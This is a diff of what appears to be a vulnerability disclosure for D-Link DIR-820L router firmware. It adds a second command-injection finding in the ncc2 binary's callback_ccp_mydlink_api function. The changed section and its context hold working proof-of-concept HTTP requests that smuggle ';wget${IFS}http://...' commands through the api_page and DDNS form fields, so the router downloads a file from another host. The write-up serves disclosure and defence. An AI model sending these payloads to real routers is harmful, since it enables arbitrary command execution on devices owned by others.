@@ -61,4 +61,32 @@ Cookie: hasLogin=1
 
 ccp_act=doCheck&ddnsHostName=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsUsername=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsPassword=123123123
 ```
+## Vulnerability2
+#### Describe
 
+​	Router firmware such as D-Link dir-820l "callback_ccp_mydlink_api" function in ncc2 binary file for command injection, which can cause arbitrary command execution
+
+#### Detail
+
+​	There is a “callback_ccp_mydlink_api” function in the ncc2 binary file, as shown below in IDA，api_page parameter accepted
+<img src="./img/image-20211221143528591.png" alt="image-20211221143528591" style="zoom:50%;" />
+Only need to use single quotes to close the content to cause command injection
+<img src="./img/image-20211221143653263.png" alt="image-20211221143653263" style="zoom:50%;" />
+#### POC
+```
+POST /mydlink_api.ccp HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: application/xml, text/xml, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 54
+Origin: http://192.168.0.1
+Connection: close
+Referer: http://192.168.0.1/tools_admin.asp
+Cookie: uid=vdu6Hjnj39; hasLogin=1
+
+api_page=";wget${IFS}http://192.168.0.100:9988/2.txt;"
+```
